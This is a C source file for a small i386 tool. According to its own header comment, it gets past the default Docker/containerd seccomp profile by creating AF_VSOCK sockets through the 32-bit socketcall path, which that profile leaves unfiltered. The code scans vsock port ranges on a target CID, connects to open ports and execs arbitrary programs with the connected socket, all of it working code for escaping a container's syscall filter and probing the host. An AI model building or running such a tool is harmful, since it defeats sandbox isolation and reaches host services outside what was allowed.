// laneD vsock32.c — freestanding i386 socketcall tool.
// The stock Docker/containerd seccomp profile blocks socket(AF_VSOCK) for the
// direct x86_64 syscall but allows socketcall(2) unconditionally (32-bit ABI),
// so this tool creates AF_VSOCK sockets through socketcall.
//
// Modes:
//   exec <prog> [args...]                create socket, exec prog (env VSOCK_FD / VSOCK_ERRNO)
//   call <cid> <port> <prog> [args...]   create+connect, print local cid/port, exec prog (VSOCK_FD)
//   scan <cid> <port>                    create+connect to one port, report
//   scanrange <cid> <p0> <p1>            scan port range, print OPEN lines
//   localcid                             bind CID_ANY, getsockname -> print local cid/port
//
// Build: gcc -m32 -nostdlib -static -no-pie -fno-pie -fno-stack-protector -fno-builtin -Os -o vsock32 vsock32.c
#define SYS_socketcall 102
#define SYS_execve     11
#define SYS_write      4
#define SYS_exit       1
#define SYS_alarm      27
#define SYS_signal     48
#define SYS_close      6

#define AF_VSOCK 40
#define SOCK_STREAM 1
#define VMADDR_CID_ANY 0xFFFFFFFFu
#define VMADDR_PORT_ANY 0xFFFFFFFFu

#define CALL_SOCKET      1
#define CALL_CONNECT     3
#define CALL_GETSOCKNAME 6

typedef unsigned int u32;
typedef unsigned short u16;
typedef unsigned char u8;

struct sockaddr_vm {
    u16 svm_family;
    u16 svm_reserved1;
    u32 svm_port;
    u32 svm_cid;
    u8  svm_zero[4];
};

static inline int sc(int nr, int a, int b, int c, int d, int e, int f) {
    int ret;
    __asm__ __volatile__("int $0x80"
        : "=a"(ret)
        : "a"(nr), "b"(a), "c"(b), "d"(c), "S"(d), "D"(e)
        : "memory", "cc");
    return ret;
}

static int strlen_(const char *s){ int n=0; while(s[n]) n++; return n; }
static void puts_(const char *s){ sc(SYS_write,1,(int)s,strlen_(s),0,0,0); }
static void putn_(int v){ char b[12]; int i=11; if(v<0){puts_("-");v=-v;} if(v==0)b[--i]='0'; while(v){b[--i]='0'+(v%10);v/=10;} sc(SYS_write,1,(int)(b+i),11-i,0,0,0); }
static void putsn_(const char *s, int v){ puts_(s); putn_(v); puts_("\n"); }
static void eol(void){ puts_("\n"); }

static int mkvar(char *buf, const char *name, int val){
    int i=0; while(name[i]){buf[i]=name[i];i++;} buf[i++]='=';
    char t[12]; int j=0; if(val<0){buf[i++]='-';val=-val;} if(val==0)t[j++]='0';
    while(val){t[j++]='0'+(val%10);val/=10;}
    while(j>0) buf[i++]=t[--j];
    buf[i++]=0; return i;
}

static void mkvm(struct sockaddr_vm *sa, u32 cid, u32 port){
    sa->svm_family = AF_VSOCK; sa->svm_reserved1 = 0; sa->svm_port = port; sa->svm_cid = cid;
    for (int i=0;i<4;i++) sa->svm_zero[i]=0;
}

static int atoi_(const char *p){ int v=0; while(*p){ if(*p<'0'||*p>'9') break; v=v*10+(*p-'0'); p++; } return v; }

// SIGALRM handler: empty; raw signal() semantics (no SA_RESTART) make connect return EINTR.
static void alrm(int sig){ (void)sig; }

static int vsock_socket(void){
    int args[3]; args[0]=AF_VSOCK; args[1]=SOCK_STREAM; args[2]=0;
    return sc(SYS_socketcall, CALL_SOCKET, (int)args, 0, 0, 0, 0);
}

static int vsock_connect(int fd, u32 cid, u32 port){
    struct sockaddr_vm sa; mkvm(&sa, cid, port);
    int ca[3]; ca[0]=fd; ca[1]=(int)&sa; ca[2]=16;
    return sc(SYS_socketcall, CALL_CONNECT, (int)ca, 0, 0, 0, 0);
}

int g_argc; char **g_argv;
__attribute__((naked)) void _start(void) {
    __asm__ __volatile__(
        "movl (%%esp), %%eax\n"
        "movl %%eax, g_argc\n"
        "leal 4(%%esp), %%eax\n"
        "movl %%eax, g_argv\n"
        "call real_main\n"
        "movl $1, %%eax\n"
        "xorl %%ebx, %%ebx\n"
        "int $0x80\n"
        ::: "eax","ebx","memory");
}

void real_main(void) {
    int argc = g_argc; char **argv = g_argv;
    sc(SYS_signal, 14, (int)alrm, 0, 0, 0, 0); // SIGALRM

    if (argc < 2) { puts_("usage: vsock32 exec|call|scan|scanrange|localcid ...\n"); sc(SYS_exit,1,0,0,0,0,0); }

    char *mode = argv[1];
    int m_exec = (mode[0]=='e'&&mode[1]=='x'&&mode[2]=='e'&&mode[3]=='c'&&mode[4]==0);
    int m_call = (mode[0]=='c'&&mode[1]=='a'&&mode[2]=='l'&&mode[3]=='l'&&mode[4]==0);
    int m_scan = (mode[0]=='s'&&mode[1]=='c'&&mode[2]=='a'&&mode[3]=='n'&&mode[4]==0);
    int m_sran = (mode[0]=='s'&&mode[1]=='c'&&mode[2]=='a'&&mode[3]=='n'&&mode[4]=='r');
    int m_lcid = (mode[0]=='l'&&mode[1]=='o'&&mode[2]=='c'&&mode[3]=='a'&&mode[4]=='l');

    int fd = vsock_socket();
    if (fd < 0) {
        putsn_("SOCKCALL_ERR errno=", -fd);
        if (m_exec || m_call) {
            char buf[32]; mkvar(buf, "VSOCK_ERRNO", -fd);
            char *newenv[3]; newenv[0]=buf; newenv[1]="PATH=/usr/local/bin:/usr/bin:/bin"; newenv[2]=0;
            sc(SYS_execve, (int)argv[2], (int)(argv+2), (int)newenv, 0, 0, 0);
        }
        sc(SYS_exit,2,0,0,0,0,0);
    }

    if (m_lcid) {
        struct sockaddr_vm sa; mkvm(&sa, VMADDR_CID_ANY, VMADDR_PORT_ANY);
        int len = 16;
        int ga[3]; ga[0]=fd; ga[1]=(int)&sa; ga[2]=(int)&len;
        int rc = sc(SYS_socketcall, CALL_GETSOCKNAME, (int)ga, 0, 0, 0, 0);
        puts_("SOCKET_OK fd="); putn_(fd); puts_(" LOCAL_CID=");
        if (rc == 0) { putn_((int)sa.svm_cid); puts_(" LOCAL_PORT="); putn_((int)sa.svm_port); }
        else { puts_("GETSOCKNAME_ERR="); putn_(-rc); }
        eol();
        sc(SYS_exit,0,0,0,0,0,0);
    }

    if (m_scan) {
        u32 cid = (u32)atoi_(argv[2]); u32 port = (u32)atoi_(argv[3]);
        sc(SYS_alarm, 4, 0, 0, 0, 0, 0);
        int rc = vsock_connect(fd, cid, port);
        sc(SYS_alarm, 0, 0, 0, 0, 0, 0);
        puts_("SOCKET_OK fd="); putn_(fd);
        if (rc == 0) { puts_(" CONNECT_OK cid="); putn_((int)cid); puts_(" port="); putn_((int)port); }
        else { puts_(" CONNECT_ERR errno="); putn_(-rc); }
        eol();
        sc(SYS_exit,0,0,0,0,0,0);
    }

    if (m_sran) {
        u32 cid = (u32)atoi_(argv[2]); int p0 = atoi_(argv[3]); int p1 = atoi_(argv[4]);
        int timeouts = 0, errs = 0;
        puts_("SCANRANGE cid="); putn_((int)cid); puts_(" from="); putn_(p0); puts_(" to="); putn_(p1); eol();
        for (int p = p0; p <= p1; p++) {
            int f2 = vsock_socket();
            if (f2 < 0) { putsn_("SOCKERR_ABORT errno=", -f2); break; }
            sc(SYS_alarm, 1, 0, 0, 0, 0, 0);
            int rc = vsock_connect(f2, cid, (u32)p);
            sc(SYS_alarm, 0, 0, 0, 0, 0, 0);
            sc(SYS_close, f2, 0, 0, 0, 0, 0);
            if (rc == 0) { puts_("OPEN cid="); putn_((int)cid); puts_(" port="); putn_(p); eol(); }
            else {
                int e = -rc;
                if (e == 4 || e == 110) { timeouts++; if (timeouts <= 3) putsn_("TIMEOUT port=", p); if (timeouts > 20) { puts_("SCANRANGE_ABORT timeouts\n"); break; } }
                else if (e != 111 && e != 104) { errs++; if (errs <= 6) { puts_("ERR port="); putn_(p); putsn_(" errno=", e); } }
            }
        }
        puts_("SCANRANGE_DONE cid="); putn_((int)cid); eol();
        sc(SYS_exit,0,0,0,0,0,0);
    }

    if (m_call) {
        u32 cid = (u32)atoi_(argv[2]); u32 port = (u32)atoi_(argv[3]);
        sc(SYS_alarm, 4, 0, 0, 0, 0, 0);
        int rc = vsock_connect(fd, cid, port);
        sc(SYS_alarm, 0, 0, 0, 0, 0, 0);
        if (rc != 0) { puts_("CALL_CONNECT_ERR errno="); putn_(-rc); eol(); sc(SYS_exit,5,0,0,0,0,0); }
        struct sockaddr_vm sa; mkvm(&sa, VMADDR_CID_ANY, VMADDR_PORT_ANY);
        int len = 16;
        int ga[3]; ga[0]=fd; ga[1]=(int)&sa; ga[2]=(int)&len;
        sc(SYS_socketcall, CALL_GETSOCKNAME, (int)ga, 0, 0, 0, 0);
        puts_("CALL_CONNECTED local_cid="); putn_((int)sa.svm_cid); puts_(" local_port="); putn_((int)sa.svm_port); eol();
        char vb[32], cb[32], pb[32];
        mkvar(vb, "VSOCK_FD", fd);
        mkvar(cb, "VSOCK_CID", (int)cid);
        mkvar(pb, "VSOCK_PORT", (int)port);
        char *newenv[5]; newenv[0]=vb; newenv[1]=cb; newenv[2]=pb; newenv[3]="PATH=/usr/local/bin:/usr/bin:/bin"; newenv[4]=0;
        sc(SYS_execve, (int)argv[4], (int)(argv+4), (int)newenv, 0, 0, 0);
        puts_("CALL_EXEC_FAILED\n");
        sc(SYS_exit,6,0,0,0,0,0);
    }

    if (m_exec) {
        char vb[32], pb[64];
        mkvar(vb, "VSOCK_FD", fd);
        int i=0; const char *pe="PATH=/usr/local/bin:/usr/bin:/bin"; while(pe[i]){pb[i]=pe[i];i++;} pb[i]=0;
        char *newenv[3]; newenv[0]=vb; newenv[1]=pb; newenv[2]=0;
        sc(SYS_execve, (int)argv[2], (int)(argv+2), (int)newenv, 0, 0, 0);
        puts_("EXEC_FAILED\n");
        sc(SYS_exit,3,0,0,0,0,0);
    }
    puts_("unknown mode\n");
    sc(SYS_exit,4,0,0,0,0,0);
}
